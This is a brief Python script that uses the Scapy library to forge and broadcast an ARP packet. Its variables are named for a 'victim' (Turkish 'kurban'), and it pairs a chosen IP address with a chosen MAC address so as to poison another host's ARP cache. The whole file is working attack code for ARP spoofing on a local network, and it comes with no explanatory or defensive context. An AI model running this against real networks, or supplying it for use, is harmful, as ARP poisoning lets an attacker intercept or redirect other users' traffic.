from scapy.all import *



kurbanArpPaket=ARP(op=1, psrc="10.0.40.67", pdst="10.0.40.3", hwdst="00:00:00:00:00:00", hwsrc="00:00:e3:0c:95:f8")

KurbanEtherPaket=Ether(src="00:00:e3:0c:95:f8",dst="ff:ff:ff:ff:ff:ff")

kurbanPaket=KurbanEtherPaket/kurbanArpPaket

sendp(kurbanPaket)
